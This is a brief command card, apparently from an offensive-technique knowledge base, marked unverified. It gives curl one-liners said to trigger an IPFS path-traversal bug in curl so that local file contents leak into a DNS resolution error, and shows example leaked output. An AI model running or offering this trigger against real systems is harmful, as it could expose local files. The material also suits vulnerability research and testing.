---
id: 114a86af-b1a9-4c06-8644-a808387bea3a
name: curl-trigger-ipfs-vuln
type: command
executor: bash
data: 'curl -v ipfs://dummycid 2>&1 | grep -A1 "Could not resolve host"'
output: Error with leaked host
created_at: '2024-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:16.975Z'
platforms:
  - Linux
tags:
  - curl
  - leak
  - path-traversal
verified: false
validated: true
submitted: true
---

# curl-trigger-ipfs-vuln

## Command

```bash
curl -v ipfs://dummycid 2>&1 | grep -A1 "Could not resolve host"
```

## Description

Triggers the curl IPFS path traversal by fetching a dummy CID, leaking file content in the DNS error via grep.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -v | Verbose output | Yes |
| ipfs://dummycid | Dummy IPFS URL | Yes |
| 2>&1 | Redirect stderr to stdout | Yes |
| grep -A1 | Show match and 1 following line | Yes |

## Examples

### Basic Usage

```bash
curl -v ipfs://dummycid 2>&1 | grep -A1 "Could not resolve host"
```

### Advanced Usage

```bash
curl -v --ipfs-gateway https://example.com ipfs://QmPDF 2>&1 | grep -A1 "Could not resolve host"
```

## Expected Output

"Could not resolve host: LEAKED_DATA_1744992527.invalid"

## Related

- [[commands/export-ipfs-path]]
- [[procedures/Trigger-Path-Traversal-with-curl-on-IPFS-URL]]
